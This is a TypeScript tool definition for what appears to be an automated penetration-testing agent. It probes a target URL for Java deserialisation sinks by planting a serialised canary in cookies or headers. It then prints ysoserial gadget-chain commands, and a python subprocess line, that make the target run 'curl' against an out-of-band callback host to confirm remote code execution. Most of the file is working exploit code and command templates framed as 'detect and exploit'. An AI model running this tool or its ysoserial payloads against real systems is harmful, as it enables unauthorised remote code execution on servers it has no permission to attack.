// T40 — java_deserial_probe
// Detects Java deserialisation sinks and fires ysoserial gadget chains.
// Magic bytes: base64(aced0005) = rO0AB — Java serialised object.

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'java_deserial_probe',
  description:
    'Detect and exploit Java deserialisation sinks. Looks for Java serialised objects ' +
    '(magic bytes aced0005 / base64 rO0AB) in cookies, headers, and parameters. ' +
    'Fires CommonsCollections1-7, Spring, Hibernate, and Groovy gadget chains via forge_runner ' +
    'to confirm RCE. Critical: Java deserialisation is one of the highest-yield bug classes.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'url',         type: 'string', required: true,  description: 'Target URL' },
    { name: 'method',      type: 'string', required: false, description: 'HTTP method', default: 'GET' },
    { name: 'cookie_name', type: 'string', required: false, description: 'Cookie name to probe (optional)' },
    { name: 'header_name', type: 'string', required: false, description: 'Header name to probe (optional)' },
    { name: 'oob_host',    type: 'string', required: true,  description: 'OOB callback host for RCE confirmation (from oob_check)' },
    { name: 'headers',     type: 'string', required: false, description: 'JSON extra headers (including auth)' },
    { name: 'timeout_ms',  type: 'number', required: false, description: 'Per-request timeout ms', default: 15000 },
  ],
};

// Minimal Java serialised object magic: just the header bytes as a canary probe
const JAVA_SERIAL_CANARY_B64 = 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAEdGVzdHQABHRlc3R4';

const GADGET_CHAINS = [
  'CommonsCollections1',
  'CommonsCollections5',
  'CommonsCollections6',
  'Spring1',
  'Groovy1',
  'Hibernate1',
];

async function probeForSink(url: string, method: string, headers: Record<string, string>, cookieName: string | undefined, headerName: string | undefined, timeoutMs: number): Promise<{ found_sink: boolean; sink_location: string; details: string }> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  const probeHeaders = { ...headers };

  // Inject canary into cookie and/or header
  if (cookieName) probeHeaders['Cookie'] = `${cookieName}=${JAVA_SERIAL_CANARY_B64}`;
  if (headerName) probeHeaders[headerName] = JAVA_SERIAL_CANARY_B64;

  try {
    const resp = await fetch(url, { method, headers: probeHeaders, signal: controller.signal });
    clearTimeout(timer);
    const text = await resp.text();

    const hasMagicBytes = text.includes('rO0AB') || text.includes('aced0005');
    const hasClassCast = /ClassCastException|ClassNotFoundException|InvalidClassException/i.test(text);
    const hasDeserialError = /java\.io\.|ObjectInput|readObject|UnmarshalException/i.test(text);

    if (hasDeserialError || hasClassCast) {
      return { found_sink: true, sink_location: cookieName || headerName || 'response body', details: `Deserialisation error leaked: ${text.substring(0, 200)}` };
    }
    if (hasMagicBytes) {
      return { found_sink: true, sink_location: 'response body', details: 'Java serial magic bytes reflected in response' };
    }
    return { found_sink: false, sink_location: '', details: `status=${resp.status} len=${text.length}` };
  } catch (e) {
    clearTimeout(timer);
    return { found_sink: false, sink_location: '', details: String(e) };
  }
}

export const javaDeserialProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const url = String(params.url || '');
    const method = String(params.method || 'GET').toUpperCase();
    const cookieName = params.cookie_name ? String(params.cookie_name) : undefined;
    const headerName = params.header_name ? String(params.header_name) : undefined;
    const oobHost = String(params.oob_host || '');
    const timeoutMs = Number(params.timeout_ms || 15000);

    if (!url) return { output: 'url required', parsed: { error: 'missing_url' } };
    if (!oobHost) return { output: 'oob_host required (use oob_check to generate)', parsed: { error: 'missing_oob_host' } };

    let headers: Record<string, string> = { 'User-Agent': 'Mozilla/5.0 GENESIS/4.0' };
    try { if (params.headers) Object.assign(headers, JSON.parse(String(params.headers))); } catch { /* ignore */ }

    // Step 1: Probe for sink
    const sinkResult = await probeForSink(url, method, headers, cookieName, headerName, timeoutMs);

    const lines = [
      `java_deserial_probe — ${url.substring(0, 80)}`,
      `Sink detection: ${sinkResult.found_sink ? '⚡ FOUND' : 'not detected'}`,
      sinkResult.found_sink ? `  Location: ${sinkResult.sink_location}` : '',
      sinkResult.details ? `  Details: ${sinkResult.details.substring(0, 200)}` : '',
      '',
    ].filter(l => l !== '');

    if (sinkResult.found_sink) {
      lines.push('GADGET CHAINS TO TEST (run via forge_runner with ysoserial):');
      for (const chain of GADGET_CHAINS) {
        lines.push(`  - ysoserial ${chain} "curl ${oobHost}/${chain}" | base64 | <inject into ${sinkResult.sink_location}>`);
      }
      lines.push('');
      lines.push('RECOMMENDED NEXT STEPS:');
      lines.push(`  1. forge_runner: python3 -c "import subprocess; subprocess.run(['java', '-jar', 'ysoserial.jar', 'CommonsCollections5', 'curl ${oobHost}/cc5-hit'], capture_output=True)"`);
      lines.push(`  2. oob_check: verify callback received from target`);
      lines.push(`  3. If callback received → RCE confirmed → emit VULNERABILITY at critical severity`);
    } else {
      lines.push('No Java deserialisation sink detected at this endpoint.');
      lines.push('If you suspect serialisation (base64 cookie, AMF, XML deserialization), try:');
      lines.push('  - Providing specific cookie_name or header_name parameters');
      lines.push('  - Checking POST body parameters for serialised Java objects');
    }

    return {
      output: lines.join('\n'),
      parsed: { sink_found: sinkResult.found_sink, sink_location: sinkResult.sink_location, gadget_chains: GADGET_CHAINS, oob_host: oobHost },
    };
  },
};
